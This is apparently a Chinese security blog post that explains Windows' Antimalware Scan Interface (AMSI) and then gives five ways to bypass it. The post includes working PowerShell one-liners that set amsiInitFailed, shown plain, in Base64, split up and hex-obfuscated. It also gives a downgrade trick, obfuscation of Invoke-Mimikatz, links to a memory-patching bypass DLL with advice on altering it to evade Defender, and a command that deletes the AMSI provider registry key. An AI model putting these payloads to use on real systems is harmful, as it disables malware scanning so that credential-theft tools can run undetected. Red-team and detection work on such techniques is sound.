## 什么是AMSI？

Antimalware Scan Interface(AMSI)译为反恶意软件扫描接口，它是一种防御机制，用于检查 PowerShell、UAC
等是否有恶意数据传入。它主要针对在 PowerShell 或其他 AMSI 集成环境中执行的命令和脚本。如果检测到任何恶意内容，AMSI
将停止执行并将其发送至 Windows Defender 进一步分析。

目前防病毒软件更新迭代速度较快，具有许多发现恶意软件和威胁的检测机制。但是，当防病毒软件无法检查完全依赖于内存且不落在磁盘上的文件内容时，对 AMSI
的需求就会增加。防病毒软件会对磁盘上的文件和试图创建进程的文件执行检测。但是，如果攻击者试图通过命令或恶意无文件脚本执行在内存中加载运行时，AMSI
就会对命令或无文件脚本中的恶意内容进行检测。

![1669084236_637c344c1d2163199c6aa.jpg!small?1669084235498](https://image.3001.net/images/20221122/1669084236_637c344c1d2163199c6aa.jpg!small?1669084235498)

与 AMSI 集成的 Windows 组件有：

  1. 用户帐户控制（EXE、COM、MSI 或 ActiveX 安装更新）
  2. PowerShell（脚本、交互式使用和动态代码调试）
  3. Windows 脚本（wscript.exe 和 cscript.exe）
  4. JavaScript 和 VBScript
  5. Office VBA 宏![1669084262_637c3466550055b2e8b9c.jpg!small?1669084261383](https://image.3001.net/images/20221122/1669084262_637c3466550055b2e8b9c.jpg!small?1669084261383)

## 它是怎么工作的？

当用户启动 PowerShell（或 PowerShell_ISE）进程或脚本时，库会自动加载到该进程中。该库提供了与防病毒软件交互所需的
API。在执行之前，使用远程过程调用 (RPC) 将脚本或命令发送到 Microsoft Defender，然后Microsoft Defender
会分析收到的信息并将响应发送回去。如果检测到已知签名，则会停止执行并显示一条消息，表明该脚本已被防病毒程序阻止。

## 如何绕过检查？

### 1.PowerShell降级

如果运行 Powershell 的 payload 时被AMSI拦截 ，可以将 PowerShell 版本降级到 2.0，因为 AMSI 仅支持 v2.0
之后的版本。

首先，可以看到我们的关键字被amsi屏蔽了。

![1669084300_637c348c1b0655fc5ff6a.jpg!small?1669084299043](https://image.3001.net/images/20221122/1669084300_637c348c1b0655fc5ff6a.jpg!small?1669084299043)

然后降级到版本2并再次运行被拦截的命令

powershell -version 2

"amsiutils"  
  
---  
  
![1669084328_637c34a8d0bed929d80e4.jpg!small?1669084327769](https://image.3001.net/images/20221122/1669084328_637c34a8d0bed929d80e4.jpg!small?1669084327769)

但这里最大的缺点是许多函数或脚本无法在 PowerShell 2.0 上运行。所以，可以尝试其他方法。

### 2.混淆

AMSI 根据某些关键字检测签名，所以对这些关键字进行混淆处理是可以绕过的。

例如，混淆 invoke-mimikatz 命令

Invoke-Mimikatz

"Inv"+"o"+"ke"+"-Mimi"+"katz"  
  
---  
  
![1669084353_637c34c14db6334627f63.jpg!small?1669084352370](https://image.3001.net/images/20221122/1669084353_637c34c14db6334627f63.jpg!small?1669084352370)

将字符串拆分开，然后通过“+”号连接起来，就可以绕过 AMSI。

然而，这种技术有其自身的缺点。payload可能会触发一次或多次
AMSI，所以在每次运行payload后都需要排查逐个关键字，此种方法非常耗时且会产生较多的攻击流量。

这里也可以尝试通过[https://amsi.fail](https://amsi.fail/)来混淆代码。

### 3.内存劫持

Daniel Duggan 在他的博客中发表了关于可以绕过 AMSI 的[内存劫持](https://rastamouse.me/memory-patching-amsi-bypass/)[技术](https://rastamouse.me/memory-patching-amsi-bypass/)的文章。逻辑是通过 Hook 函数 AmsiScanBuffer() ，让它始终返回句柄AMSI_RESULT_CLEAN，达到欺骗
AMSI 没有发现恶意软件的效果。

以下是一些利用工具：

https://github.com/rasta-mouse/AmsiScanBufferBypass

https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998

https://gist.github.com/am0nsec/986db36000d82b39c73218facc557628

https://gist.github.com/am0nsec/854a6662f9df165789c8ed2b556e9597

https://github.com/med0x2e/NoAmci  
  
---  
  
首先，运行 Invoke-Mimikatz 命令，看看 AMSI 是否正常工作。

![1669084394_637c34ea08893ec8052c1.jpg!small?1669084392959](https://image.3001.net/images/20221122/1669084394_637c34ea08893ec8052c1.jpg!small?1669084392959)

上面的链接是原始代码，也可以直接访问下面的链接进行下载。

https://github.com/rasta-mouse/AmsiScanBufferBypass

https://github.com/harshitrajpal/AmsiScanBufferBypass/releases/download/publish/ASBBypass.dll  
  
---  
  
下载后，需将dll的名称“AmsiScanBufferBypass”改为“Project”或任意名称，因为 AMSI
会识别并拦截字符串“AmsiScanBufferBypass”！

运行以下命令即可绕过：

[System.Reflection.Assembly]::LoadFile("C:\Users\H0e4a0r1t\Desktop\ASBBypass.dll")

[Amsi]::Bypass()  
  
---  
  
![1669084420_637c35043cd0817ce62bb.jpg!small?1669084419250](https://image.3001.net/images/20221122/1669084420_637c35043cd0817ce62bb.jpg!small?1669084419250)

Tips:

关于ASBBypass.dll 如何绕过Windows Defender，我这里选择了Virtest跑一遍特征码，之后直接修改绕过。

![1669084466_637c35323ab3aa7dbbc68.jpg!small?1669084465239](https://image.3001.net/images/20221122/1669084466_637c35323ab3aa7dbbc68.jpg!small?1669084465239)

修改几个数值后即可绕过检测了

![1669084483_637c354339e2e7ed73dcf.jpg!small?1669084483185](https://image.3001.net/images/20221122/1669084483_637c354339e2e7ed73dcf.jpg!small?1669084483185)

![1669084494_637c354e6d31b724b84b7.jpg!small?1669084493654](https://image.3001.net/images/20221122/1669084494_637c354e6d31b724b84b7.jpg!small?1669084493654)

### 4.Base64编码

对运行时触发 AMSI 的字符串（AmsiUtils和amsiInitFailed）使用base64编码，可以用来逃避关键字检测。

通过设置 “amsiInitFailed” 函数值为true来阻止当前进程的AMSI扫描功能。

原始AMSI Bypass

[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)  
  
---  
  
Base64编码

[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)  
  
---  
  
![1669084530_637c357252b5c8a530665.jpg!small?1669084529758](https://image.3001.net/images/20221122/1669084530_637c357252b5c8a530665.jpg!small?1669084529758)

拆分混淆变形

$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'

$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))

$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')

$field.SetValue($null,$true)  
  
---  
  
![1669084543_637c357fe44f32854f36d.jpg!small?1669084543047](https://image.3001.net/images/20221122/1669084543_637c357fe44f32854f36d.jpg!small?1669084543047)

Hex编码

[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69
6C 73".Split("
")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61
6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split("
")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)  
  
---  
  
![1669084557_637c358d364b8eb8585a4.jpg!small?1669084556135](https://image.3001.net/images/20221122/1669084557_637c358d364b8eb8585a4.jpg!small?1669084556135)

### 5.删除 AMSI 注册表项

通过管理员权限，攻击者可以删除 HKLM\Software\Microsoft\AMSI 中的 AMSI Provider 注册表项以禁用 AMSI 。

使用以下命令将删除 AMSI注册表项。

Remove-Item -Path
"HKLM:\SOFTWARE\Microsoft\AMSI\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}"
-Recurse  
  
---  
  
![1669084586_637c35aadb62db859f02f.jpg!small?1669084585987](https://image.3001.net/images/20221122/1669084586_637c35aadb62db859f02f.jpg!small?1669084585987)

恢复命令：

New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name
"{2781761E-28E0-4109-99FE-B9D127C57AFE}" -ErrorAction Ignore | Out-Null  
  
---  
  
![1669084602_637c35ba65d9f57c48cdb.jpg!small?1669084601313](https://image.3001.net/images/20221122/1669084602_637c35ba65d9f57c48cdb.jpg!small?1669084601313)

## 结论

上面的例子演示了部分绕过 AMSI 的方法，即使 AMSI 加强了对 Windows 10 和 Windows Server 系统的保护，
Microsoft Defender 也提供了一些针对 AMSI
绕过的保护，但攻击者仍在不断尝试新的方法来隐藏恶意内容以防止被检测。谨以此文作为广大技术爱好者参考，力争能在此领域的对抗有所突破。

